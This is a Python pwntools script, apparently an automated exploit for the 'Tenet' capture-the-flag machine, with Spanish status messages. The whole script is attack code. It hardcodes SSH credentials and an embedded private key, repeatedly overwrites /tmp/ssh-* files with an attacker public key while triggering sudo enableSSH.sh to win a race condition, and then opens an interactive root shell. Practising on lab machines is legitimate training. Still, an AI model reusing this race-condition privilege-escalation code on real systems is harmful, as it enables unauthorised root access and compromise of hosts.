try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Tenet ~ GatoGamer1155\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

rsa = ("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAArAAAABNlY2RzYS\n1zaGEyLW5pc3RwNTIxAAAACG5pc3RwNTIxAAAAhQQAV+el7yuxnYFf7OIrTmrtkcCc+SIX\nB2Kx57Iy7C6tqnRt9a75XTAg+BMLS2bBVu5GOfUJmzb1MdGwS3qXjng8P2EA3x5Wbk3QKX\n53brevFwG7DTCJ+Y4w+rO7LGcUx26pNS0IOTPTlOiIAmW55vDm1X0XRVR1yQkZKAuY6JyE\nMyaO5JcAAAEQabjlkWm45ZEAAAATZWNkc2Etc2hhMi1uaXN0cDUyMQAAAAhuaXN0cDUyMQ\nAAAIUEAFfnpe8rsZ2BX+ziK05q7ZHAnPkiFwdiseeyMuwurap0bfWu+V0wIPgTC0tmwVbu\nRjn1CZs29THRsEt6l454PD9hAN8eVm5N0Cl+d263rxcBuw0wifmOMPqzuyxnFMduqTUtCD\nkz05ToiAJluebw5tV9F0VUdckJGSgLmOichDMmjuSXAAAAQgDqFgsGASYZOcTRf2U760nc\nmu4YpvT7/Q0vKEuz9l70jUalAI/F9nf08dpXjE/2/BiUNKXDvaVYUW1eFaIBu3W4aAAAAB\nJFQ0RTQSA1MjEgYml0IEtleXM=\n-----END OPENSSH PRIVATE KEY-----")

os.system('echo "%s" > key' % (rsa))

def exploit():
    conn = ssh(host='Tenet', user='neil', password='Opera2112')
    neil = conn.process("/bin/sh")
    neil.sendline(b'while true; do for rsa in /tmp/ssh-*; do echo "ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBABX56XvK7GdgV/s4itOau2RwJz5IhcHYrHnsjLsLq2qdG31rvldMCD4EwtLZsFW7kY59QmbNvUx0bBLepeOeDw/YQDfHlZuTdApfndut68XAbsNMIn5jjD6s7ssZxTHbqk1LQg5M9OU6IgCZbnm8ObVfRdFVHXJCRkoC5jonIQzJo7klw== ECDSA 521 bit Keys" > $rsa; done; done')

threading.Thread(target=exploit, args=()).start()
time.sleep(6)
nect = ssh(host='Tenet', user='neil', password='Opera2112')
privesc = nect.process("/bin/sh")
privesc.sendline(b"sudo enableSSH.sh; sudo enableSSH.sh; sudo enableSSH.sh; enableSSH.sh; enableSSH.sh; enableSSH.sh; enableSSH.sh; enableSSH.sh; enableSSH.sh; enableSSH.sh; enableSSH.sh")

time.sleep(3)
request = ssh(host='Tenet', user='root', keyfile='key')
shell = request.process("/bin/sh")
shell.interactive()
